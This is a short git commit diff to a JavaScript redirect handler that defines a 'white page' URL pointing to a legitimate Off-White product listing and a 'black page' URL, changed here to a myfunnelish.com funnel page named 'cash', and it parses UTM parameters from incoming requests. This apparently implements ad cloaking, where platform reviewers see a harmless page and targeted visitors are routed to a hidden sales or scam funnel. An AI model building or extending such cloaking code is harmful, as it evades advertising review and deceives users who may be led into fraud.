1d69799f07472c038b95db58c4fd422a2d276801
mirajmiju <mirajali.miju@gmail.com>
2025-01-01 03:27:36 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.off---white.com/en-us/shopping/off-white-crystal-stripes-long-polo-24376752";
-    const blackPageURL = "https://ovehjvcmyn.myfunnelish.com/imbassd-1735585797507357-1735682545793627-1735683392416256";
+    const blackPageURL = "https://ovehjvcmyn.myfunnelish.com/cash-1735683944333709";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
